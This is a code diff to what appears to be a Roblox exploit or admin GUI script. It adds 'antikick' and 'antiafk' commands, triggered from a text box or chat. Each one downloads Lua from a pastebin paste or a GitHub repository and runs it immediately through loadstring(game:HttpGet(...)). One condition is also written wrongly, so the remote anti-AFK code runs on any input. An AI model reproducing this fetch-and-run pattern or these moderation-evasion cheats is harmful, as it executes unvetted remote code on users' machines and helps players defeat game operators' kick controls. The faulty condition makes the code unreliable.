@@ -279,6 +279,14 @@ game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Water)
 coroutine.resume(Rejoin)
 				script.Parent.Text = ""
 			end
+				
+			if script.Parent.Text == "antikick" then
+				loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
+			end
+				
+			if script.Parent.Text == "antiafk" or "antiidle" then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/luca5432/Roblox-ANTI-AFK-SCRIPT/main/Script"))()
+			end
 		end
 	end)
 	
@@ -425,6 +433,18 @@ local function IJMZCS_fake_script() -- MainFrame.ChatCmds
 		end)
 
 coroutine.resume(Rejoin)
+			end
+		end)
+		
+		Player.Chatted:connect(function(cht)
+			if cht:match("/antiafk") then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/luca5432/Roblox-ANTI-AFK-SCRIPT/main/Script"))()
+			end
+		end)
+			
+		Player.Chatted:connect(function(cht)
+			if cht:match("/antikick") then
+				loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
 			end
 		end)
 	end)
